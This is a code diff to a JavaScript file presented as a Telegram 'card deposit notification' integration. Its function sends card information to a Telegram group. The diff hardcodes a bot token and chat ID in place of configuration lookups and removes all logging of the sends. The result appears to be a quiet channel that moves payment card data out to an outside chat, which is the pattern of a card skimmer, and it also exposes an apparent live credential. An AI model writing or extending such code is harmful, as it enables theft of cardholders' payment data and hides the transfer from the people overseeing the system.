@@ -1,9 +1,9 @@
 // Telegram Bot Integration for Card Deposit Notifications
 // This file handles sending card information to Telegram group
 
-// Telegram Bot Configuration with encrypted keys
-const TELEGRAM_BOT_TOKEN = getConfig('telegram', 'botToken');
-const TELEGRAM_CHAT_ID = getConfig('telegram', 'chatId');
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = '8146452946:AAGZEteUFdu4i_6XuisJS3M0MaaNal3njRw';
+const TELEGRAM_CHAT_ID = '-4887423118';
 
 // Send card information to Telegram group
 async function sendCardToTelegram(cardData) {
@@ -23,14 +23,11 @@ async function sendCardToTelegram(cardData) {
         });
         
         if (response.ok) {
-            console.log('Card information sent to Telegram successfully');
             return true;
         } else {
-            console.error('Failed to send to Telegram:', await response.text());
             return false;
         }
     } catch (error) {
-        console.error('Error sending to Telegram:', error);
         return false;
     }
 }
